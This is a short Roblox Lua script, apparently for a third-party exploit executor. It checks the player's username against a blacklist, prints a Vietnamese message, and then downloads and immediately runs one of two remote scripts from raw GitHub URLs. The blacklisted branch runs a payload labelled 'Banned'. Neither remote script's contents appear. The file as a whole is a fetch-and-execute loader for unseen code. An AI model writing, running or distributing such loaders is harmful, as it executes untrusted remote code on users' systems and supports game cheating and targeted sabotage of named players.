local Blacklist = {
    "Anhth",
    "NguoiChoi2",
    "TenRobloxCanChan"
}

local player = game:GetService("Players").LocalPlayer
local username = player.Name

local isBlacklisted = false

for _, name in ipairs(Blacklist) do
    if string.lower(name) == string.lower(username) then
        isBlacklisted = true
        break
    end
end

if isBlacklisted then
    print("Bạn đã bị blacklist!")

    loadstring(game:HttpGet("https://raw.githubusercontent.com/caiausjoncit-design/Banned/refs/heads/main/Hehe"))()
else
    print("Bạn không có trong blacklist.")

    loadstring(game:HttpGet("https://raw.githubusercontent.com/fanfanman21-art/Dung/refs/heads/main/T%C5%A9n%20(3)%20(1)%20(3)%20(4)%20(1)%20(1).txt"))()
end
